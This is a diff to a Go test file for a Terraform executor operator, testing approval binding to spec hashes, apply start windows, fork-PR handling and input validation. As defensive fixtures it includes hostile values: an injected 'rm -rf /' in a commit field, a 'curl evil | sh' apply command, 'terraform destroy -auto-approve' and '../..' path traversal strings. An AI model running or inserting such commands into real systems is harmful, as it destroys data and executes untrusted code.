@@ -181,10 +181,10 @@ func (x *execEnv) decide(t *testing.T, name, state string, mut func(*v1.Approval
 func TestExecutorPRPlan(t *testing.T) {
 	x := newExecEnv(t, executor(nil))
 	x.f.open = []pullRequest{
-		{Number: 7, Head: headSHA, Base: "main"},
-		{Number: 8, Head: strings.Repeat("4", 40), Base: "main"},     // does not touch infra/
-		{Number: 9, Head: "not-a-sha; rm -rf /", Base: "main"},       // invalid commit: ignored
-		{Number: 10, Head: strings.Repeat("5", 40), Base: "release"}, // other branch
+		{Number: 7, Head: headSHA, HeadRepo: "acme/platform", Base: "main"},
+		{Number: 8, Head: strings.Repeat("4", 40), HeadRepo: "acme/platform", Base: "main"}, // does not touch infra/
+		{Number: 9, Head: "not-a-sha; rm -rf /", Base: "main"},                              // invalid commit: ignored
+		{Number: 10, Head: strings.Repeat("5", 40), Base: "release"},                        // other branch
 	}
 	x.f.files[7] = []string{"infra/addons.tf"}
 	x.f.files[8] = []string{"docs/readme.md", "infrastructure.md"}
@@ -360,19 +360,24 @@ func TestExecutorApprovalRefusals(t *testing.T) {
 		mut   func(*v1.Approval)
 		event string
 	}{
-		"denied":       {"denied", nil, ""},
-		"expired":      {"expired", nil, ""},
-		"other hash":   {"allowed", func(a *v1.Approval) { a.Status.ContentHash = strings.Repeat("0", 64) }, "executor.refused/high"},
-		"late decided": {"allowed", func(a *v1.Approval) { d := metav1.NewTime(a.Spec.Expires.Add(time.Minute)); a.Status.DecidedAt = &d }, ""},
+		"denied":                {"denied", nil, ""},
+		"void":                  {"void", func(a *v1.Approval) { a.Status.Reason = "the pull request is closed" }, ""},
+		"pending past deadline": {"", func(a *v1.Approval) { a.Status = v1.ApprovalStatus{} }, ""},
+		"decided too long ago":  {"allowed", nil, ""},
+		"other hash":            {"allowed", func(a *v1.Approval) { a.Status.ContentHash = strings.Repeat("0", 64) }, "executor.refused/high"},
+		"late decided":          {"allowed", func(a *v1.Approval) { d := metav1.NewTime(a.Spec.Expires.Add(time.Minute)); a.Status.DecidedAt = &d }, ""},
 	}
 	for n, tc := range cases {
 		t.Run(n, func(t *testing.T) {
 			x := newExecEnv(t, executor(nil))
 			an := mergeToApproval(t, x)
-			if n == "late decided" {
+			if n == "late decided" || n == "pending past deadline" {
 				x.now = x.now.Add(25 * time.Hour)
 			}
 			x.decide(t, an, tc.state, tc.mut)
+			if n == "decided too long ago" {
+				x.now = x.now.Add(31 * time.Minute) // e.g. the operator was down after the decision
+			}
 			x.poll(t)
 			x.poll(t)
 			var runs v1.ExecutorRunList
@@ -448,7 +453,7 @@ func TestExecutorOldMergesIgnored(t *testing.T) {
 
 func TestExecutorPausedAndInvalid(t *testing.T) {
 	x := newExecEnv(t, executor(func(e *v1.Executor) { e.Spec.Paused = true }))
-	x.f.open = []pullRequest{{Number: 7, Head: headSHA, Base: "main"}}
+	x.f.open = []pullRequest{{Number: 7, Head: headSHA, HeadRepo: "acme/platform", Base: "main"}}
 	x.f.files[7] = []string{"infra/a.tf"}
 	x.poll(t)
 	var runs v1.ExecutorRunList
@@ -522,4 +527,174 @@ func TestApprovalHashMatchesSidecar(t *testing.T) {
 	if approvalHash("ab", "") == approvalHash("a", "b") {
 		t.Fatal("field boundaries must matter")
 	}
+}
+
+// TOCTOU (#116 review): the approval binds image digest, apply argv and the Executor spec hash. A change of the
+// Executor after the plan or after the decision never applies with the new spec.
+func TestExecutorApprovalBindsSpec(t *testing.T) {
+	x := newExecEnv(t, executor(nil))
+	an := mergeToApproval(t, x)
+	s := x.approval(t, an).Spec
+	e := executor(nil)
+	if !strings.Contains(s.Input, "image "+digest) || !strings.Contains(s.Input, `apply argv ["terraform","apply","$(PLAN_FILE)"]`) ||
+		!strings.Contains(s.Input, "executor spec sha256 "+specHash(e)) {
+		t.Fatalf("approval input does not bind the spec: %s", s.Input)
+	}
+	if r := x.run(t, "tf-prod-merge-"+mergeSH[:12]); r.Status.SpecHash != specHash(e) {
+		t.Fatalf("merge run spec hash %q", r.Status.SpecHash)
+	}
+	changes := map[string]func(*v1.Executor){
+		"image":       func(e *v1.Executor) { e.Spec.Image = "evil/tf@sha256:" + strings.Repeat("b", 64) },
+		"apply argv":  func(e *v1.Executor) { e.Spec.Apply.Command = []string{"sh", "-c", "curl evil | sh"} },
+		"credentials": func(e *v1.Executor) { e.Spec.ApplyCredentials.ServiceAccountName = "exec-tf-prod-admin" },
+	}
+	for n, m := range changes {
+		if specHash(executor(m)) == specHash(e) {
+			t.Errorf("%s: spec hash unchanged", n)
+		}
+	}
+	// changed between the plan and the decision: the merge run closes, refused, no apply
+	x.decide(t, an, "allowed", nil)
+	x.update(t, changes["image"])
+	x.poll(t)
+	x.poll(t)
+	if x.applies(t) != 0 {
+		t.Fatal("apply with a changed image")
+	}
+	if !strings.Contains(strings.Join(x.events(t), ","), "executor.refused/high") {
+		t.Fatal("refusal not recorded")
+	}
+}
+
+func TestExecutorApplyRefusedWhenSpecChangesAfterDecision(t *testing.T) {
+	x := newExecEnv(t, executor(nil))
+	an := mergeToApproval(t, x)
+	x.decide(t, an, "allowed", nil)
+	x.poll(t) // creates the apply run (not started yet)
+	name := "tf-prod-apply-" + mergeSH[:12]
+	if r := x.run(t, name); r.Spec.SpecHash != specHash(executor(nil)) || r.Spec.NotAfter == nil ||
+		!r.Spec.NotAfter.Time.Equal(x.now.Add(30*time.Minute)) {
+		t.Fatalf("apply run spec %+v", r.Spec)
+	}
+	x.update(t, func(e *v1.Executor) { e.Spec.Apply.Command = []string{"terraform", "destroy", "-auto-approve"} })
+	x.poll(t)
+	r := x.run(t, name)
+	if r.Status.Phase != "Failed" || !strings.Contains(r.Status.Message, "spec changed") {
+		t.Fatalf("apply status %+v", r.Status)
+	}
+	var j batchv1.Job
+	if err := x.c.Get(context.Background(), types.NamespacedName{Namespace: execNS, Name: name}, &j); err == nil {
+		t.Fatal("apply Job started with a changed spec")
+	}
+}
+
+func TestExecutorApplyStartWindow(t *testing.T) {
+	x := newExecEnv(t, executor(nil))
+	an := mergeToApproval(t, x)
+	x.decide(t, an, "allowed", nil)
+	x.poll(t) // creates the apply run
+	x.now = x.now.Add(31 * time.Minute)
+	x.poll(t) // too late to start
+	r := x.run(t, "tf-prod-apply-"+mergeSH[:12])
+	if r.Status.Phase != "Failed" || !strings.Contains(r.Status.Message, "start window") {
+		t.Fatalf("apply status %+v", r.Status)
+	}
+}
+
+func TestExecutorOnePerEnvironment(t *testing.T) {
+	first := executor(nil)
+	second := executor(func(e *v1.Executor) {
+		e.Name, e.UID, e.Spec.ForgeSecret = "tf-prod2", "uid-2", "exec-tf-prod2-forge"
+		e.Spec.PlanCredentials = v1.ExecutorCredentials{SecretName: "exec-tf-prod2-plan"}
+		e.Spec.ApplyCredentials = v1.ExecutorCredentials{SecretName: "exec-tf-prod2-apply"}
+		e.CreationTimestamp = metav1.NewTime(first.CreationTimestamp.Add(time.Hour))
+	})
+	x := newExecEnv(t, first, second)
+	x.f.open = []pullRequest{{Number: 7, Head: headSHA, HeadRepo: "acme/platform", Base: "main"}}
+	x.f.files[7] = []string{"infra/a.tf"}
+	x.p.PollAll(context.Background())
+	x.p.PollAll(context.Background())
+	var got v1.Executor
+	_ = x.c.Get(context.Background(), types.NamespacedName{Namespace: execNS, Name: "tf-prod2"}, &got)
+	if got.Status.Phase != "invalid" || !strings.Contains(got.Status.Conditions[0].Message, "already has executor tf-prod") {
+		t.Fatalf("duplicate status %+v", got.Status)
+	}
+	var runs v1.ExecutorRunList
+	_ = x.c.List(context.Background(), &runs, client.MatchingLabels{"agentdev/executor": "tf-prod2"})
+	if len(runs.Items) != 0 {
+		t.Fatal("duplicate executor started work")
+	}
+	_ = x.c.List(context.Background(), &runs, client.MatchingLabels{"agentdev/executor": "tf-prod"})
+	if len(runs.Items) != 1 {
+		t.Fatalf("oldest executor runs: %d", len(runs.Items))
+	}
+	if n := strings.Count(strings.Join(x.events(t), ","), "executor.refused/high"); n != 1 {
+		t.Fatalf("refusal recorded %d times, want once", n)
+	}
+	if o := envOwners([]v1.Executor{*second, *first}); o["prod"] != "tf-prod" {
+		t.Fatalf("owner %v", o)
+	}
+}
+
+func TestExecutorForkPRs(t *testing.T) {
+	for _, allow := range []bool{false, true} {
+		x := newExecEnv(t, executor(func(e *v1.Executor) { e.Spec.AllowForkPRs = allow }))
+		x.f.open = []pullRequest{
+			{Number: 7, Head: headSHA, HeadRepo: "mallory/platform", Base: "main"},
+			{Number: 8, Head: strings.Repeat("4", 40), HeadRepo: "", Base: "main"}, // head repository deleted
+		}
+		x.f.files[7] = []string{"infra/a.tf"}
+		x.f.files[8] = []string{"infra/a.tf"}
+		x.poll(t)
+		var runs v1.ExecutorRunList
+		_ = x.c.List(context.Background(), &runs)
+		want := map[bool]int{false: 0, true: 2}[allow]
+		if len(runs.Items) != want {
+			t.Fatalf("allowForkPRs=%v: %d runs, want %d", allow, len(runs.Items), want)
+		}
+	}
+}
+
+func TestValidExecutorRejects(t *testing.T) {
+	bad := map[string]func(*v1.Executor){
+		"unpinned image":    func(e *v1.Executor) { e.Spec.Image = "hashicorp/terraform:latest" },
+		"short digest":      func(e *v1.Executor) { e.Spec.Image = "hashicorp/terraform@sha256:abc" },
+		"tag and no digest": func(e *v1.Executor) { e.Spec.Image = "hashicorp/terraform@sha256:" + strings.Repeat("A", 64) },
+		"dotdot path":       func(e *v1.Executor) { e.Spec.Path = "infra/../../etc" },
+		"dotdot repo":       func(e *v1.Executor) { e.Spec.Repo = "acme/.." },
+		"dotdot branch":     func(e *v1.Executor) { e.Spec.Branch = "main/../x" },
+		"long name":         func(e *v1.Executor) { e.Name = strings.Repeat("a", 41) },
+	}
+	for n, m := range bad {
+		if validExecutor(executor(m)) == "" {
+			t.Errorf("%s: accepted", n)
+		}
+	}
+}
+
+func TestCheckoutDeepCommit(t *testing.T) {
+	// a commit deeper than the shallow fetch is found by unshallowing the protected branch, never by fetching the id
+	if !strings.Contains(checkoutScript, `fetch -q --no-tags --unshallow -- "$REPO_URL" "$REF"`) ||
+		strings.Contains(checkoutScript, `"$REPO_URL" "$COMMIT"`) {
+		t.Fatal("checkout script: " + strings.SplitN(checkoutScript, "\n", 2)[0])
+	}
+}
+
+func (x *execEnv) update(t *testing.T, mut func(*v1.Executor)) {
+	t.Helper()
+	var e v1.Executor
+	if err := x.c.Get(context.Background(), types.NamespacedName{Namespace: execNS, Name: "tf-prod"}, &e); err != nil {
+		t.Fatal(err)
+	}
+	mut(&e)
+	if err := x.c.Update(context.Background(), &e); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func (x *execEnv) applies(t *testing.T) int {
+	t.Helper()
+	var runs v1.ExecutorRunList
+	_ = x.c.List(context.Background(), &runs, client.MatchingLabels{"agentdev/stage": "apply"})
+	return len(runs.Items)
 }
